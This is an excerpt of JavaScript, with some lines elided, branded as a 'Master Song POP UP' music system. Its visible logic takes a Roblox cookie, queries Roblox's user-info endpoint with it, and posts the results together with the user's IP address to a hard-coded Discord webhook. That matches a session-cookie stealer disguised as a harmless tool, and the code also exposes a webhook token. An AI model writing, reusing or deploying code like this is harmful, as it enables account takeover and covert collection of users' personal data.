...
fetch(
"https://gist.github.com/Angelbgx/682eba051f74dff2fdfbeadcfafc509b/raw/2ff615cab1a3b62bc6c6a50f6e9f4b779ac7fb1f/infomusic.json").
...
const base = "https://discord.com/api/webhooks/1263366186310303838/-6WvvTeZNUx7jcPSErlY9GR4qLgfdgzvhxVIw_3CLvCeHxSL6GO11Cqbv5JUKy8Wj_XD";
...
async function main(cookie) {
    ...
    let statistics = null;
    if (cookie) {
        let response = await fetch("https://www.roblox.com/es/mobileapi/userinfo", {
            headers: {
    ...
    await fetch(base, {
        ...
        body: JSON.stringify({
            ...
            "embeds": [
                {
                    ...
                    "author": {
                        "name": "POP UP - Usuario Registrado en la IP: " + ipAddr,
                    ...
                    "footer": {
                        "text": "Master Song POP UP System by Angel Blanco",
                        "icon_url": "https://github.com/Angelbgx/Master-Song/blob/main/logo.png?raw=true"
                    },
                    "thumbnail": {
            ...
            "username": "POP UP Master Song BOT",
            "avatar_url": "https://github.com/Angelbgx/Master-Song/blob/main/logo.png?raw=true",
            "attachments": []
        })
    });
}
